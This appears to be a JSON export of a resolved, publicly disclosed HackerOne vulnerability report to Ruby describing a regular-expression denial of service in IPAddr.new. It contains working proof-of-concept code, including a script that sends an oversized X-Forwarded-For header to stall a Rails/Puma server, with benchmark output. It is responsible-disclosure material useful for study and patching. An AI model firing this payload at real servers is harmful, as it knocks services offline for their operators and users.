@@ -1,0 +1,125 @@
+{
+  "id": 1485717,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDg1NzE3",
+  "url": "https://hackerone.com/reports/1485717",
+  "title": "ReDoS in IPAddr",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2022-02-19T07:30:52.384Z",
+  "submitted_at": "2022-02-19T07:30:52.414Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ooooooo_q",
+    "url": "/ooooooo_q",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/20fc426031f09e5347054871ae4e3af2478fd2b3d5e8a321468ecf6f2da5ac20"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 7724,
+    "url": "https://hackerone.com/ruby",
+    "handle": "ruby",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/007/724/bb067434deef370d6a0b16c2cbbc030b57c75e92_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Ruby",
+      "twitter_handle": "",
+      "website": "https://www.ruby-lang.org",
+      "about": "A Programmer's Best Friend"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2025-07-08T22:57:09.097Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-06-08T22:56:53.406Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello, I found a pattern that occur ReDoS in `IPAddr.new`.\n\nhttps://github.com/ruby/ipaddr/blob/v1.2.4/lib/ipaddr.rb#L525\n\n```ruby\n  def mask!(mask)\n    case mask\n    when String\n      case mask\n      when /\\A(0|[1-9]+\\d*)\\z/\n        prefixlen = mask.to_i\n```                 \n\n`/\\A(0|[1-9]+\\d*)\\z/` is vulnerable.\n\nIt is a detect result by `recheck` ( https://makenowjust-labs.github.io/recheck/ ).\n\n{F1624909}\n\nhttps://github.com/ruby/ipaddr/blob/v1.2.4/lib/ipaddr.rb#L628\n\n```ruby\n  def initialize(addr = '::', family = Socket::AF_UNSPEC)\n    ...\n    prefix, prefixlen = addr.split('/', 2)\n    if prefix =~ /\\A(.*)(%\\w+)\\z/\n      prefix = $1\n      zone_id = $2\n      family = Socket::AF_INET6\n    end\n    ...\n    if prefixlen\n      mask!(prefixlen)\n    else\n      @mask_addr = (@family == Socket::AF_INET) ? IN4MASK : IN6MASK\n    end\n  end\n```  \n\n`mask!` is used in `IPAddr.new`.\n\n\n## PoC\n\n```\n❯ ruby -v\nruby 3.1.1p18 (2022-02-18 revision 53f5fc4236) [arm64-darwin20]\n\n❯ irb\nirb(main):001:0> require 'time'\n=> true\nirb(main):002:0> IPAddr.new(\"0.0.0.0/\" + '1' * 50000 + '.')\n# => ReDoS (and raise ArgumentError)\n```\n\nIt is also used by `coerce_other`, so it affects other methods as well.\n\n```\nIPAddr.new(\"192.168.2.0/24\").include?(\"0.0.0.0/\" + '1' * 50000 + '.' )\nIPAddr.new(\"192.168.2.0/24\") == \"0.0.0.0/\" + '1' * 50000 + '.'\nIPAddr.new(\"192.168.2.0/24\") | \"0.0.0.0/\" + '1' * 50000 + '.'\nIPAddr.new(\"192.168.2.0/24\") & \"0.0.0.0/\" + '1' * 50000 + '.'\n```\n\n\n## benchmark\n\nipaddr_benchmark.rb\n\n```ruby\nrequire 'benchmark'\nrequire 'ipaddr'\n  \ndef ipaddr_new(length)\n  text = \"0.0.0.0/\" + '1' * length + '.'\n  IPAddr.new(text)\nrescue IPAddr::InvalidAddressError\n  nil\nend\n\nBenchmark.bm do |x|\n  x.report { ipaddr_new(100) }\n  x.report { ipaddr_new(1000) }\n  x.report { ipaddr_new(10000) }\n  x.report { ipaddr_new(100000) }\nend\n```\n\n```\n❯ bundle exec ruby ipaddr_benchmark.rb\n       user     system      total        real\n   0.000056   0.000003   0.000059 (  0.000055)\n   0.002921   0.000003   0.002924 (  0.002968)\n   0.300863   0.000694   0.301557 (  0.302580)\n  31.050866   0.103006  31.153872 ( 31.255489)\n```\n\n---\n\n\n## Rails\n\nSince it is used in `ActionDispatch::RemoteIp`, it is possible to attack using custom headers.\n\nhttps://github.com/rails/rails/blob/v7.0.2.2/actionpack/lib/action_dispatch/middleware/remote_ip.rb#L172\n\n```ruby\n    private\n      def ips_from(header) # :doc:\n        return [] unless header\n        # Split the comma-separated list into an array of strings.\n        ips = header.strip.split(/[,\\s]+/)\n        ips.select do |ip|\n          # Only return IPs that are valid according to the IPAddr#new method.\n          range = IPAddr.new(ip).to_range\n          # We want to make sure nobody is sneaking a netmask in.\n          range.begin == range.end\n        rescue ArgumentError\n          nil\n        end\n      end\n```     \n\n### PoC\n\ncreate rails server\n\n```\n❯ rails new rails_server -G -M -O -C -A -J -T      \n\n❯ cd rails_server\n\n❯ bundle exec rails s\n=> Booting Puma\n=> Rails 7.0.2.2 application starting in development\n=> Run `bin/rails server --help` for more startup options\nPuma starting in single mode...\n* Puma version: 5.6.2 (ruby 3.1.1-p18) (\"Birdie's Version\")\n*  Min threads: 5\n*  Max threads: 5\n*  Environment: development\n*          PID: 13989\n* Listening on http://127.0.0.1:3000\n* Listening on http://[::1]:3000\n```\n\nipaddr_request.rb\n\n```ruby\nrequire 'net/http'\n\nurl = URI.parse('http://127.0.0.1:3000/')\n\nreq = Net::HTTP::Get.new(url.path)\n\nreq['X-Forwarded-For'] =  \"0.0.0.0/\" + '1' * 80000 + '.' \n\nres = Net::HTTP.start(url.host, url.port) {|http|\n  http.request(req)\n}\n```\n\n```\n❯ time bundle exec ruby ipaddr_request.rb\nbundle exec ruby ipaddr_request.rb  0.18s user 0.08s system 0% cpu 40.302 total\n```\n\n## Impact\n\nReDoS occurs when `IPAddr.new` accepts user input.\n\nRails uses `ActionDispatch::RemoteIp` by default, so it can be attacked by a request from the client.\n\nIf using nginx etc., the header length is limited to about 8k bytes, so it seems to be less affected. ( https://stackoverflow.com/questions/686217/maximum-on-http-header-values )\n\nOn the other hand, puma is susceptible because it can be used up to 80 * 1024.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1624909,
+      "file_name": "recheck_1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vaibsm0kb2itl5zntpnnt6udukfr?response-content-disposition=attachment%3B%20filename%3D%22recheck_1.png%22%3B%20filename%2A%3DUTF-8%27%27recheck_1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4UMZOQGF%2F20260502%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260502T163420Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQCL3gGOJIhQsbez10RNqrCPwHjN81xt2AM9PqBQGVW3uwIhANOXWET1Jb%2F0rpPyQiBSUBxyZ0eVagihTmXIJhoWy0YXKrIFCD4QAxoMMDEzNjE5Mjc0ODQ5Igwys7fr%2Bt6AnEhhIvcqjwXkJyV1L45YT9%2FiJYTOKRXpQAPhSJZ4IMyvUZyqTi%2B0cacU2mTVAQXKdTzgjTfy5a9BagGrwukCQN1hH0QrrtNjjt%2FEqzHk4vDNpDMmdJDoQ2Z9sArRVgqQbXwrT1Lxu1BxhddgDPqJz3QVNdCoUUokPIRkr2OQktIugWlgPg8R1ZntFaD1b9EWYoBX%2FTl9DwpaOeuu7aJkaacaawvSEfPldIHIznXiJAjJmARIlCGdzd%2FZ%2BkvDp0UOGqIqAY1eiltem0tNBvYzjIVxdFtCBVHAAC8WKuECz30JEy0qOlDKHLhyXhudmCPRcOmFei1YxF0YgxtJxadlyt8maXKpnqh5uPsKUdabRrTRhFTUQLw8%2Bf%2FJERrlB%2BK6yaEOL16g2AxStp0RkaGveb5xTZKPz5pISnD5Fnd07P8fe2uMBH88Jq9wBa07fVM%2BIExVLGj13sr%2FiBMqfk0x4%2Fkl3R%2BJ6itr0xF3C%2BQDSiu4HviN1XFQ5%2BK6PvlAQk9Qoyalh2yiqNNaplz1ZzGw6jE4ifuepM6G9o83RsgJDn57mOYo23dwpwvHEeShoKr%2B7yn%2FE6Ay5fvBfm9IR6AsP7TpB5vud0t7WTa3klNlXLo1ob1nuDITC2nP1rxpWaMCJcjXBiNodrgqt8wX6wznwyxCISMUrO4JbZqFikj6g7trCoPrw0zJCBgbHVPOYCPgYhEuaa%2BocJ%2FG4ks3oVlNnoFFA5iMQoVhReB2Mq2r9DnJWRyKzeGVFFNprVRpkmX8ii%2BtNPWoaaGf0zDop7fuWVXCqPL0yGCpCFVFiS3psXZO12757hm4RLTE0NNg8M5kpoygL32ATAXbn3wPyC%2BtapWZ0eDHDVD8rvrEsg2f%2FO731wznOlO7MOHm188GOrABEm0rU%2FSW3KKjbFHk1VFbxEt8q3cmNfTV%2BVsPtNM6INxPsapYUAqrQrF169xbBRi%2BIWvumjMZBrI0oJV4ovtlfLd%2FMuj35XaaIt5nh9OVTMX4l1xorCtr9%2BaHFX71w%2BFT9xR7ngW1%2FFyaydJ%2FpC1%2BICFfmNH0pzQg%2F1Kt%2BLSe5UVf4TDl6ebwpIzMGsE7zryvWYC7E6VvK8lpWZ29AxnIOegbrT25p7x37OgH9B2pSWU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=46983bd3798b7f670483251969bddc21e88646532652f76cf61e8256c1ab4068",
+      "file_size": 280950,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2025-07-08T22:56:53.518Z",
+  "allow_singular_disclosure_after": -25724247.009400528,
+  "singular_disclosure_allowed": true,
+  "vote_count": 31,
+  "voters": [
+    "zy9ard3",
+    "mohaned0101",
+    "thalaivar304",
+    "ahmed_xyz",
+    "2026",
+    "0xm394tr0n",
+    "dr4k0n5600",
+    "0xsevil",
+    "kainn0x",
+    "singularities_entity",
+    "and 21 more..."
+  ],
+  "structured_scope": {
+    "databaseId": 28212,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/ruby/ruby",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
